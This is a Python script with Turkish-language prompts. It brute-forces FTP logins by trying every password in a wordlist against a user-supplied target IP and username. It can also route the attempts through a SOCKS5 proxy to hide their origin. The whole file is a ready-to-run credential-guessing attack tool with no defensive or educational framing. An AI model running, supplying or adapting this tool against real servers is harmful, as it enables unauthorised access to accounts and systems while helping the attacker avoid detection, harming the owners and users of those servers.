from ftplib import FTP
import socks
import socket

def ftp_bruteforce(target_ip, username, password_list, proxy_info=None):
    if proxy_info:
        socks.set_default_proxy(socks.SOCKS5, proxy_info['proxy_ip'], int(proxy_info['proxy_port']))
        socket.socket = socks.socksocket

    with open(password_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                ftp = FTP(target_ip)
                ftp.login(user=username, passwd=password)
                print(f"[+] Parola bulundu: {password}")
                ftp.quit()
                return
            except Exception as e:
                print(f"[-] Başarısız deneme: {password}")

    print("[!] Parola bulunamadı.")

def main():
    target_ip = input("Hedef IP adresini girin: ")
    username = input("Kullanıcı adını girin: ")
    password_list = input("Wordlist dosya yolunu girin: ")

    use_proxy = input("Proxy kullanmak ister misiniz? (evet/hayır): ").lower()
    proxy_info = None

    if use_proxy == 'evet':
        proxy_ip = input("Proxy IP adresini girin: ")
        proxy_port = input("Proxy portunu girin: ")
        proxy_info = {'proxy_ip': proxy_ip, 'proxy_port': proxy_port}

    ftp_bruteforce(target_ip, username, password_list, proxy_info)

if __name__ == "__main__":
    main()